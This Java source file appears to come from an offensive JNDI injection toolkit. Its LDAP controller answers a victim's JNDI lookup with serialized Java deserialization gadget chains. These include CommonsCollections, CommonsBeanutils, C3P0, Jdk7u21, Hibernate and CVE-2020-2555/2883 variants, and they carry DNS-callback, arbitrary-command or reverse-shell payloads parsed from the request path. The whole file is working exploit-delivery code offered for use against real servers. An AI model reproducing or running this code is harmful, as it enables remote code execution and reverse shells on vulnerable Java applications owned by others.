package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.*;
import com.nu1r.jndi.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/deserialization"})
public class SerializedDataController implements LdapController {
    private GadgetType  gadgetType;
    private PayloadType payloadType;
    private String[]    params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));

        //这个方法里面有改动，其他基本无改动
        Entry  e     = new Entry(base);
        byte[] bytes = null;
        switch (gadgetType) {
            case urldns:
                bytes = URLDNS.getBytes(params[0]);
                break;
            case commonsbeanutils1:
                bytes = CommonsBeanutils1.getBytes(payloadType, params);
                break;
            case commonsbeanutils2:
                bytes = CommonsBeanutils2.getBytes(payloadType, params);
                break;
            case commonsbeanutils3:
                bytes = CommonsBeanutils3.getBytes(payloadType);
                break;
            case commonsbeanutils2nocc:
                bytes = CommonsBeanutils2NOCC.getBytes(payloadType, params);
                break;
            case commonsbeanutils3183:
                bytes = CommonsBeanutils3183.getBytes(payloadType);
                break;
            case commonsbeanutils1183nocc:
                bytes = CommonsBeanutils1183NOCC.getBytes(payloadType, params);
                break;
            case commonscollections1:
                bytes = CommonsCollections1.getBytes(payloadType);
                break;
            case commonscollections1_1:
                bytes = CommonsCollections1_1.getBytes(payloadType);
                break;
            case commonscollections2:
                bytes = CommonsCollections2.getBytes(payloadType, params);
                break;
            case commonscollections3:
                bytes = CommonsCollections3.getBytes(payloadType, params);
                break;
            case commonscollections4:
                bytes = CommonsCollections4.getBytes(payloadType, params);
                break;
            case commonscollections5:
                bytes = CommonsCollections5.getBytes(payloadType);
                break;
            case commonscollections6:
                bytes = CommonsCollections6.getBytes(payloadType);
                break;
            case commonscollections7:
                bytes = CommonsCollections7.getBytes(payloadType);
                break;
            case commonscollections7lite_4:
                bytes = CommonsCollections7Lite.getBytes(payloadType);
                break;
            case commonscollections8:
                bytes = CommonsCollections8.getBytes(payloadType, params);
                break;
            case commonscollections9:
                bytes = CommonsCollections9.getBytes(payloadType);
                break;
            case commonscollections10:
                bytes = CommonsCollections10.getBytes(payloadType, params);
                break;
            case commonscollectionsk1:
                bytes = CommonsCollectionsK1.getBytes(payloadType, params);
                break;
            case commonscollectionsk2:
                bytes = CommonsCollectionsK2.getBytes(payloadType, params);
                break;
            case commonscollections6lite:
                bytes = CommonsCollections6Lite.getBytes(payloadType, params);
                break;
            case commonscollections6lite_4:
                bytes = CommonsCollections6Lite_4.getBytes(payloadType);
                break;
            case jdk7u21:
                bytes = Jdk7u21.getBytes(payloadType, params);
                break;
            case jre8u20:
                bytes = Jre8u20.getBytes(payloadType, params);
                break;
            case c3p0:
                bytes = C3P0.getBytes(payloadType);
                break;
            case c3p02:
                bytes = C3P02.getBytes(payloadType);
                break;
            case c3p03:
                bytes = C3P03.getBytes(payloadType);
                break;
            case c3p04:
                bytes = C3P04.getBytes(payloadType);
                break;
            case signedobject:
                SignedObject signedObject = new SignedObject();
                bytes = signedObject.getBytes(payloadType);
                break;
            case aspectjweaver:
                bytes = AspectJWeaver.getBytes(payloadType);
                break;
            case beanshell1:
                bytes = BeanShell1.getBytes(payloadType);
                break;
            case c3p092:
                bytes = C3P092.getBytes(payloadType);
                break;
            case click1:
                bytes = Click1.getBytes(payloadType, params);
                break;
            case clojure:
                bytes = Clojure.getBytes(payloadType);
                break;
            case cve_2020_2555:
                bytes = CVE_2020_2555.getBytes(payloadType, params);
                break;
            case cve_2020_2883:
                bytes = CVE_2020_2883.getBytes(payloadType, params);
                break;
            case jython1:
                bytes = Jython1.getBytes(payloadType);
                break;
            case json:
                bytes = JSON1.getBytes(payloadType, params);
                break;
            case groovy1:
                bytes = Groovy1.getBytes(payloadType);
                break;
            case hibernate1:
                bytes = Hibernate1.getBytes(payloadType, params);
                break;
            case hibernate2:
                bytes = Hibernate2.getBytes(payloadType);
                break;
            case javassistweld1:
                bytes = JavassistWeld1.getBytes(payloadType, params);
                break;
            case jbossinterceptors1:
                bytes = JBossInterceptors1.getBytes(payloadType, params);
                break;
            case jdk7u21variant:
                bytes = Jdk7u21variant.getBytes(payloadType, params);
                break;
            case jrmpclient:
                bytes = JRMPClient.getBytes(payloadType);
                break;
            case jrmpclient_activator:
                bytes = JRMPClient_Activator.getBytes(payloadType);
                break;
            case jrmpclient_obj:
                bytes = JRMPClient_Obj.getBytes(payloadType);
                break;
            case jrmplistener:
                bytes = JRMPListener.getBytes(payloadType);
                break;
        }

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", bytes);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println("[+] GaddgetType >> " + gadgetType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            if (gadgetType == GadgetType.urldns) {
                String url = "http://" + base.substring(base.lastIndexOf("/") + 1);
                System.out.println("[+] URL >> " + url);
                params = new String[]{url};
                return;
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                System.out.println("[+] PayloadType >> " + payloadType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            switch (payloadType) {
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println("[+] URL >> " + url);
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println("[+] Command >> " + cmd);
                    params = new String[]{cmd};
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println("[+] IP >> " + results[0]);
                    System.out.println("[+] Port >> " + results[1]);
                    params = results;
                    break;
            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
